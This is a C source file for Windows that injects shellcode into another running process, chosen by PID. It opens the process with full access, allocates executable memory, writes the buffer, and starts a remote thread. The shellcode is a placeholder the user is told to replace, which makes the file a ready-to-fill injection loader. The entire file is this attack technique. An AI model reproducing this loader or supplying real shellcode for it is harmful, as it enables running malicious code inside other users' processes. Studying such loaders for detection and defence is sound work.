#include <windows.h>
#include <stdio.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__)

DWORD PID, TID = NULL; // we need this for openprocess() 
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

unsigned char shellcode[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"; // <--- change this 


int main(int argc, char* argv[]) {
    if (argc < 2) {
        info("usage: program.exe <PID>");
        return EXIT_FAILURE;
    }
    
    PID = atoi(argv[1]);
    info("trying to open a handle to process (%ld)", PID);
    
/* HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
); */  
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    info("got a handle to the process! \\ ---0x%p", hProcess);

    if (hProcess == NULL) {
        warn("couldn't get a handle to the process (%ld), error %ld", PID, GetLastError()); // get an error code to help with debugging
        return EXIT_FAILURE;
    }

    /* allocate bytes to process memory */
/* LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
); */
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    info("allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions", sizeof(shellcode));

    WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), NULL);
    info("wrote %zu-bytes to process memory\n", sizeof(shellcode));

    /* create thread to run the shellcode 
    HANDLE CreateRemoteThreadEx(
  [in]            HANDLE                       hProcess,
  [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
  [in]            SIZE_T                       dwStackSize,
  [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
  [in, optional]  LPVOID                       lpParameter,
  [in]            DWORD                        dwCreationFlags,
  [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [out, optional] LPDWORD                      lpThreadId
);*/

    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

    if (hThread == NULL) {
        warn("failed to get a handle to the thread, error: %ld", GetLastError()); // get an error code to help with debugging
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    info("got a handle to the thread (%ld) \ ---0x%p\n", TID, hThread);

    info("executing thread....");
    WaitForSingleObject(hThread, INFINITE);
    info("thread finished executing.");

    info("closing handles....");
    CloseHandle(hProcess);
    CloseHandle(hThread);
    info("finished! closing now :D goodbye");
    return EXIT_SUCCESS;
}
